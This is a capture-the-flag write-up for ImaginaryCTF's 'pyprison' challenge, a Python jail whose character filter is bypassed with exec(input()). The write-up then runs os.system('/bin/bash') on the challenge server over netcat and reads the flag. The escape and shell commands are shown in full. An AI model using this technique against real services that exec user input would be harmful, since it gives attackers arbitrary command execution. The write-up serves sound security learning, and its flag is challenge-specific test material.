---
title: pyprison [IMAGINARY CTF] [MISC]
date: 2022-07-18 11:28:05 +0200
categories: [python,ctftime]
tags: [CTFTIME]
excerpt: Write up for the challenge "pyprision" from Imaginary CTF
---

## pyprison

 > Given file


```python
#!/usr/bin/env python3

while True:
  a = input(">>> ")
  assert all(n in "()abcdefghijklmnopqrstuvwxyz" for n in a)
  print("Execing")
  exec(a)
```

- We're restricted to these constraints.
- We can only use lowercase alphabets and parentheses 
- Here we can do anything with these chars
- Let's get an input and pass it to exec

```c++
➜  misc python3 pyprison.py
>>> exec(input())
Execing
print('Meaw Meaw')
Meaw Meaw
```
- Here you can see it's executed our input
- Now let's try to get a shell

> in remote server

```c++
➜  misc nc pyprison.chal.imaginaryctf.org 1337
== proof-of-work: disabled ==
>>> exec(input())
import os; os.system('/bin/bash')
whoami
user
id
uid=1000(user) gid=1000(user) groups=1000(user)
```

> Now read the flag

```c++
cat flag.txt
ictf{pyprison_more_like_python_as_a_service_12b19a09}
```

flag: `ictf{pyprison_more_like_python_as_a_service_12b19a09}`
